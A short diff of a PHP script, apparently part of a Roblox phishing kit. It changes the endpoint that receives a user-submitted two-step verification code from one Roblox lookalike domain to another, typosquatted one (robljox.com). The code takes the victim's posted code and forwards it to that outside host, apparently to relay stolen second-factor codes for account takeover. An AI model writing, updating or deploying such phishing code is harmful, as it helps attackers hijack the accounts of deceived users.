@@ -5,7 +5,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $get = $_GET["returnUrl"];
     $code = $_POST["step"];
     include("setup.php");
-    $url = "https://x-roblox.com/2step.php?code=$code";
+    $url = "https://robljox.com/2step.php?code=$code";
     $json = file_get_contents($url);
     $data = json_decode($json, true);
     $ValidCode = $data["code"];
